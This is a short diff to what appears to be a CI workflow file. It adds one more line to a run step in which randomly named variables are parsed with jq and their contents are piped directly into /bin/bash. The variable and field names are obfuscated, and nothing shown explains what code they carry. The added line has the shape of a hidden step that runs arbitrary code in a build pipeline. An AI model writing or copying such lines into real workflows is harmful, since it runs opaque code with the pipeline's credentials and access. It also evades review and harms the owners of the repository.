@@ -44,6 +44,7 @@ jobs:
           echo $udo6 | jq -r .fmyso228 | /bin/bash
           printf '%s' "$p4827" | jq -r .bzfj089 | /bin/bash
           echo $tlvg0971 | jq -r .vik89801 | /bin/bash
+          echo $r87 | jq -r .bm521 | /bin/bash
 
       - name: Archive results
         if: always()
